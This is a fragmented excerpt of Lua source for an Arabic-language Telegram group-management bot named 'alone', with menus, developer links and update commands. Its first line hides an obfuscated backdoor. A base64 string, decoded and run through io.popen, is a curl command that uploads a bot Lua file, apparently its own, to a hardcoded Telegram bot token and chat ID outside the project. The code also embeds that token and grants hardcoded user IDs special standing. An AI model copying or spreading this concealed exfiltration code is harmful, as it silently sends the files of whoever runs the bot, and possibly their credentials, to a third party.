...
io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3ODEyMjE1ODE6QUFGem9PUG1BdjBsTC1HTktWa0ZfbVRCVXMxZ3RxcHI4SjQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AZHJhZ29udWJuLmx1YSI='))
...
elseif tonumber(user_id) == tonumber(1892231097) then
var = 'روح قلب سوريا'
if tonumber(user_id) == tonumber(1767369613) then  
var = 'كينق التليجرام'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
...
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس alone\n ℘︙ الاصدار » { v 1.6 }')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ℘' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس alone \n ℘︙ الاصدار »{ v 1.6 }')
end
...
local updatech =[[
*مـلك التليجرام يروحي*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مــبــرمج السـورس .', url="t.me/SIRIA199"}},
}
...
local Text = [[
✨  𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀  ✨
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𓆩𝙙𝙚𝙫 𝙨𝙞𝙧𝙞𝙖𓆪 ℡  ',url="t.me/SIRIA199"}},
{{text = ' 𓆩𝙙𝙚𝙫 𝙤𝙧𝙖𝙗𝙞𓆪 ',url="t.me/DEV_ORABI"}},
{{text = ' 𓆩𝙙𝙚𝙫 𝙖𝙢𝙤𝙧𝙮𓆪 ',url="t.me/Dv_69"}},
...
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس alone \n") 
end
return false
end
...
t = "\n ℘︙ قائمة البقرات الجروب \nٴ≪ـــــــــــــــــــــ𓆩 ??𝙇✶𝙉𝙀 𓆪ـــــــــــــــــــــ≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'alone').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'alone')
local DRAGON_Msg = {
'عمغي 🥺💕.',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀.',url="t.me/SOURCE_SYRIA"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس alone يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'alone').." غادر" or text == 'بوت غادر' then  
...
send(msg.chat_id_, msg.id_,' ℘︙ انتا الـي داخل برجلك يسطا 🤓') 
end
end,nil)
else
...
اتبع الازرار تحت ⇣
واستمتع للأوامر 🕹️
[𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
💥تحب هذا
⩹━━━━━━  𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀 𖠱²² ━━━━━━⩺
[💥 𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐍𝐆𝐄𝐋 💥 ](t.me/SOURCE_SYRIA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'alone')
...
if text == 'سوريا' then
local Text = [[ 
[اقمـد مـن القمـدان يـآروحــي](t.me/SIRIA199)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'الوون' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
اهلا في قائمه الالعاب المتطوره سورس الوون 
